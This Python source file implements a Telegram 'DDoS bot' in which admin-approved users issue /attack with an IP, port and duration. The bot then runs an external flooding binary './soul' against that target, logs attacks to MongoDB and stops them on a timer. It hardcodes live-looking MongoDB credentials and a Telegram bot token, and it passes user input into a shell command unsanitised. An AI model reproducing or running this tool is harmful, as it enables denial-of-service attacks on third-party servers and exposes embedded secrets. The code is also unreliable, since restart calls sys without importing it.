import os
import subprocess
import threading
import json
from datetime import datetime, timedelta
from telegram import Update, ParseMode
from telegram.ext import Updater, CommandHandler, CallbackContext
from pymongo import MongoClient

# MongoDB setup
mongo_url = "mongodb+srv://Bishal:Bishal@bishal.dffybpx.mongodb.net/?retryWrites=true&w=majority&appName=Bishal"
client = MongoClient(mongo_url)
db = client['zoya']
approved_users_collection = db['approved_users']
attack_history_collection = db['attack_history']

admins = [5670958127]
active_attacks = {}

# Fetch approved users from MongoDB
def get_approved_users():
    approved_users = {}
    for user in approved_users_collection.find():
        approved_users[user['_id']] = {
            "approved_date": user['approved_date'],
            "expires_on": user['expires_on']
        }
    return approved_users

# Fetch attack history from MongoDB
def get_attack_history():
    attack_history = {}
    for attack in attack_history_collection.find():
        attack_history[attack['user_id']] = attack['history']
    return attack_history

approved_users = get_approved_users()
attack_history = get_attack_history()

# Save approved users to MongoDB
def save_approved_user(user_id, approved_data):
    approved_users_collection.update_one(
        {'_id': user_id},
        {'$set': approved_data},
        upsert=True
    )

# Remove approved user from MongoDB
def remove_approved_user(user_id):
    approved_users_collection.delete_one({'_id': user_id})

# Save attack history to MongoDB
def save_attack_history(user_id, attack_data):
    attack_history_collection.update_one(
        {'user_id': user_id},
        {'$push': {'history': attack_data}},
        upsert=True
    )

# Command to start bot
def start(update: Update, context: CallbackContext) -> None:
    user_id = update.effective_user.id
    if user_id in approved_users:
        update.message.reply_text("Welcome to our DDoS bot! To see all available commands, use /help")
    else:
        update.message.reply_text("You are not approved ??")

# Command to show help
def help_command(update: Update, context: CallbackContext) -> None:
    user_id = update.effective_user.id
    if user_id in approved_users:
        update.message.reply_text("Available commands:\n/attack <ip> <port> <time>")
    else:
        update.message.reply_text("You are not approved ??")

# Command to approve a user
def approve(update: Update, context: CallbackContext) -> None:
    user_id = update.effective_user.id
    if user_id not in admins:
        update.message.reply_text("You do not have permission to use this command.")
        return

    try:
        target_id = int(context.args[0])
        days = int(context.args[1])
        approved_data = {
            "_id": target_id,
            "approved_date": str(datetime.now()),
            "expires_on": str(datetime.now() + timedelta(days=days))
        }
        approved_users[target_id] = approved_data
        save_approved_user(target_id, approved_data)
        update.message.reply_text(f"User {target_id} approved for {days} days.")
    except (IndexError, ValueError):
        update.message.reply_text("Usage: /approve <user_id> <days>")

# Command to disapprove a user
def disapprove(update: Update, context: CallbackContext) -> None:
    user_id = update.effective_user.id
    if user_id not in admins:
        update.message.reply_text("You do not have permission to use this command.")
        return

    try:
        target_id = int(context.args[0])
        if target_id in approved_users:
            del approved_users[target_id]
            remove_approved_user(target_id)
            update.message.reply_text(f"User {target_id} has been disapproved.")
        else:
            update.message.reply_text("User is not approved.")
    except (IndexError, ValueError):
        update.message.reply_text("Usage: /disapprove <user_id>")

# Command to list approved users
def list_approved(update: Update, context: CallbackContext) -> None:
    user_id = update.effective_user.id
    if user_id not in admins:
        update.message.reply_text("You do not have permission to use this command.")
        return

    if approved_users:
        message = "Approved Users:\n"
        for uid, data in approved_users.items():
            days_left = (datetime.strptime(data['expires_on'], "%Y-%m-%d %H:%M:%S.%f") - datetime.now()).days
            message += f"User ID: {uid}, Days Left: {days_left}\n"
        update.message.reply_text(message)
    else:
        update.message.reply_text("No approved users.")

# Command to launch an attack
def attack(update: Update, context: CallbackContext) -> None:
    user_id = update.effective_user.id
    if user_id not in approved_users:
        update.message.reply_text("You are not approved ??")
        return

    try:
        ip = context.args[0]
        port = context.args[1]
        duration = int(context.args[2])

        # Notify attack started
        update.message.reply_text(f"STARTED ON\nIP: {ip}\nPORT: {port}\nTIME: {duration}")

        command = f"./soul {ip} {port} {duration} 30 432103802284"
        process = subprocess.Popen(command, shell=True)

        attack_data = {"ip": ip, "port": port, "time": duration, "start_time": str(datetime.now())}
        save_attack_history(str(user_id), attack_data)

        def end_attack():
            process.kill()
            update.message.reply_text(f"Attack over on\nIP: {ip}\nPORT: {port}\nTIME: {duration}")
        
        timer = threading.Timer(duration, end_attack)
        timer.start()
        
    except (IndexError, ValueError):
        update.message.reply_text("Usage: /attack <ip> <port> <time>")

# Command to show attack history
def show_attacks(update: Update, context: CallbackContext) -> None:
    user_id = update.effective_user.id
    if user_id not in admins:
        update.message.reply_text("You do not have permission to use this command.")
        return

    message = "Attack History (Last 24 hours):\n"
    now = datetime.now()
    for uid, attacks in attack_history.items():
        attacks_in_24h = [a for a in attacks if (now - datetime.strptime(a['start_time'], "%Y-%m-%d %H:%M:%S.%f")).total_seconds() < 86400]
        message += f"User ID: {uid}, Number of Attacks: {len(attacks_in_24h)}\n"
    
    update.message.reply_text(message)

# Command to restart bot
def restart(update: Update, context: CallbackContext) -> None:
    os.execl(sys.executable, sys.executable, *sys.argv)

# Main function to run bot
def main():
    updater = Updater("7485969308:AAGWPtzNxCtcPdB-VR-qdkztwLgS9NLoqnE", use_context=True)
    dispatcher = updater.dispatcher

    dispatcher.add_handler(CommandHandler("start", start))
    dispatcher.add_handler(CommandHandler("help", help_command))
    dispatcher.add_handler(CommandHandler("approve", approve))
    dispatcher.add_handler(CommandHandler("disapprove", disapprove))
    dispatcher.add_handler(CommandHandler("list", list_approved))
    dispatcher.add_handler(CommandHandler("attack", attack))
    dispatcher.add_handler(CommandHandler("show_attack", show_attacks))
    dispatcher.add_handler(CommandHandler("restart", restart))

    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
    main()
